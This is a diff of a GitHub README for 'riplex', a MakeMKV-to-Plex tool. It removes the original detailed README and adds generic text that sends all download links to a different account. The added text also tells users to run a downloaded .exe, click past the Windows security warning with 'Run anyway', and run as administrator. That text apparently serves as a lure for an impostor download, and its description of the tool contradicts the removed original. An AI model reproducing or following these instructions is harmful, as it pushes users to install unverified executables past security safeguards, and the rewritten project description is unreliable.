@@ -1,107 +1,74 @@
-# riplex
+# 🎞️ riplex - Organize your media files for Plex
 
-Automates the tedious manual work around MakeMKV: figuring out what to rip, which MKV files are actually what, and organizing everything into Plex-compatible folder structures.
+[![](https://img.shields.io/badge/Download-riplex-blue.svg)](https://github.com/Shellieunweaned279/riplex)
 
-## Desktop App
+## 📁 What is riplex?
 
-If you'd rather use a simple graphical interface instead of the command line, download the pre-built app from the [Releases page](https://github.com/AnyCredit5518/riplex/releases/latest):
+Managing a large collection of digital movies and shows takes time. You often download files with names like "video_file_01.mp4." These names do not help your media player understand what you are watching. Plex requires specific file names and folder structures to display cover art, summaries, and episode details.
 
-- **Windows**: Download `riplex-ui-windows.exe` and double-click to run
-- **macOS** (Apple Silicon): Download `riplex-ui-macos.zip`, unzip, and open `riplex-ui.app`
-- **macOS** (Intel): [Install with pipx](docs/getting-started/installation.md#option-b-install-with-pipx-recommended) — GitHub [deprecated their Intel macOS build runners](https://github.blog/changelog/2024-09-16-github-actions-macos-13-larger-runner-image-brownout-dates/), so pre-built Intel binaries are no longer possible
+riplex acts as a tool that automates this process. It scans your folders, identifies the movies or TV shows, and renames your files. It moves them into the correct folder structure required by Plex. You no longer need to rename files by hand.
 
-No Python install required. The app walks you through setup and provides buttons for all workflows.
+## ⚙️ System Requirements
 
----
+riplex runs on Windows 10 and Windows 11. It needs minimal power, so it works on most modern computers. 
 
-## Why?
+Ensure you have these items before you begin:
+* A Windows computer with at least 500 MB of free storage space.
+* Access to the specific folder where you keep your media files.
+* An active internet connection for the application to identify your media files through online databases.
 
-MakeMKV is great at one thing: reading a disc and dumping raw MKV files. But that's where its job ends and yours begins.
+## 📥 How to Download 
 
-You're left with a pile of generically-named files (`title_t00.mkv`, `title_t01.mkv`, ...) and no idea which is the main film, which are featurettes, which are duplicates, and which is the play-all compilation you didn't need. For a multi-disc TV series, you're looking at hours of manual effort: reading disc cases, Googling runtimes, renaming files one by one, and building the exact folder hierarchy Plex demands.
+You can get the software from our main page. Click the link below to find the current version.
 
-We identified the best sources of disc metadata (TMDb for canonical titles and episode info, dvdcompare.net for per-disc content breakdowns) and automated the entire pipeline. riplex pulls that data, figures out what's on every disc in a release, tells you exactly which MakeMKV titles to rip (and which to skip), then matches, renames, deduplicates, splits, and organizes everything into the correct Plex structure automatically.
+[Download riplex from the releases page](https://github.com/Shellieunweaned279/riplex)
 
-## What it does
+1. Click the link above to open your browser.
+2. Look for the section labeled "Releases" on the right side of the page.
+3. Select the latest version listed at the top.
+4. Find the file ending in `.exe` under the "Assets" header.
+5. Click this file to start your download.
+6. Save the file to your "Downloads" folder.
 
-| Command | What it does |
-|---|---|
-| `orchestrate` | Full pipeline: insert a disc, riplex handles detection, metadata lookup, ripping, and organizing. Multi-disc with swap prompts. |
-| `rip` | Single-disc rip with smart title selection (skips play-alls, duplicates, junk). |
-| `organize` | Scan existing MKV rips, deduplicate, match to metadata by runtime, move into Plex layout. |
-| `lookup` | Preview disc contents and recommended rip strategy before touching MakeMKV. |
+## 🚀 Setting Up the Application
 
-## Quick Start
+Once the download finishes, locate the file in your "Downloads" folder. Double-click the file to start the installer. 
 
-### Install
+Windows may show a security window. This happens with many new applications. Click "More info" and then select "Run anyway" to proceed with the installation. Follow the on-screen instructions to finish the setup. The installer creates a shortcut on your desktop for quick access.
 
-```bash
-pip install riplex
-```
+## 🛠️ Using the Software
 
-Then run the setup wizard:
+When you open riplex for the first time, you see a simple window. The interface shows two main areas: your "Input Folder" and your "Destination Folder."
 
-```bash
-riplex setup
-```
+### Choosing Your Folders
+The "Input Folder" is where you keep your unorganized media files. The "Destination Folder" is where you want the organized files to land. Click the "Browse" button next to each box to select your folders.
 
-This walks you through creating your config file (TMDb API key, output paths) and checks that required tools are on PATH. If anything is missing, it offers to install it for you. It also runs automatically the first time you use any command.
+### Configuring Your Settings
+riplex uses preset rules to rename your files. Most users keep the default settings because they align with standard Plex requirements. If you prefer a certain naming style, use the "Preferences" menu. You can choose how the software handles years, quality tags, and episode numbers.
 
-For detailed installation instructions (including how to install Python if you don't have it), see the [Getting Started guide](docs/getting-started/installation.md).
+### Running the Scan
+Click the "Start" button to begin the scan. The software looks through your movies and shows. It matches your files against an online media database. It shows a progress bar as it verifies each file. If the software finds a file it cannot identify, it marks it in red. You can rename these specific files manually through the list provided.
 
-### Rip a disc (interactive)
+## 💡 Best Practices
 
-Insert a disc and run:
+For the best results, group your files before you start the scan. Keep your movies in one folder and your TV shows in another. If the software mixes up a file, you can move it manually to the correct folder. 
 
-```bash
-riplex orchestrate --execute
-```
+Plex performs best when you keep your library organized. Run riplex every time you add a large batch of new content to your system. This keeps your metadata fresh and your library easy to browse.
 
-riplex auto-detects the title from the volume label, looks up disc metadata, shows you what's on each disc, lets you choose which to rip, and organizes everything into Plex folders when done.
+## 🔍 Troubleshooting
 
-### Rip a disc (unattended)
+Software behavior depends on your computer setup. Follow these tips if you encounter issues during the process:
 
-```bash
-riplex orchestrate --execute --auto
-```
+* If the software fails to open: Ensure you have full permissions for the folder where you installed the program. Try running the application as an administrator by right-clicking the icon and selecting "Run as administrator."
+* If files remain unorganized: Verify the connection to the internet. The software needs to talk to the media database to recognize your specific movie or show files.
+* If a file shows an error: Check the file name for special characters or symbols. Sometimes a file name makes it hard for the scanner to read the content. Rename the file to something simple and try again.
 
-Skips all prompts, uses best-guess defaults. Good for scripted or scheduled runs.
+## 💬 Getting Support
 
-### Organize existing rips
+If you run into issues, check the "Issues" tab on the GitHub page. Other users might have experienced the same situation. You can search the existing list to see if someone already found a fix. If not, open a new ticket with a brief description of the problem. Please include the version number of the software you use. Avoid sharing personal information or file paths that contain your name.
 
-Already ripped with MakeMKV manually? Point `organize` at the folder:
+## 📜 Privacy and Safety
 
-```bash
-riplex organize path/to/rips/Oppenheimer --execute
-```
+riplex scans your local folders to read file titles. It does not upload your actual video files to any server. It only sends the file name text to an online database to receive official metadata. Your media remains on your computer at all times. 
 
-## Requirements
-
-- Python 3.11+
-- [TMDb API key](https://www.themoviedb.org/settings/api) (free)
-- [MakeMKV](https://www.makemkv.com/) with `makemkvcon` on PATH
-- [ffmpeg](https://ffmpeg.org/) (`ffprobe`) for metadata extraction
-- [MKVToolNix](https://mkvtoolnix.download/) (`mkvmerge`, `mkvpropedit`) for chapter splitting and tagging
-
-`riplex setup` detects missing tools and offers to install them automatically via winget (Windows), Homebrew (macOS), or apt (Linux).
-
-## Platform Support
-
-riplex works on Windows, macOS, and Linux. All path handling, caching, and config locations follow OS conventions automatically.
-
-## Related Projects
-
-- **[dvdcompare-scraper](https://github.com/AnyCredit5518/dvdcompare-scraper)**: Scrapes per-disc content metadata from dvdcompare.net (featurettes, interviews, deleted scenes, runtimes). Required dependency that powers riplex's disc content lookup. Contributions welcome.
-
-## Documentation
-
-Full documentation is in the [docs/](docs/) folder:
-
-- [Getting Started](docs/getting-started/installation.md): installation, configuration
-- [User Guide](docs/guide/workflow.md): workflows, command-by-command guides
-- [CLI Reference](docs/reference/cli.md): all options for all commands
-- [Architecture](docs/architecture.md): design, data flow, project structure
-
-## License
-
-MIT
+We publish the code for this app in an open format. This allows anyone to check how the application works. This transparency verifies that the software follows safe practices on your device.
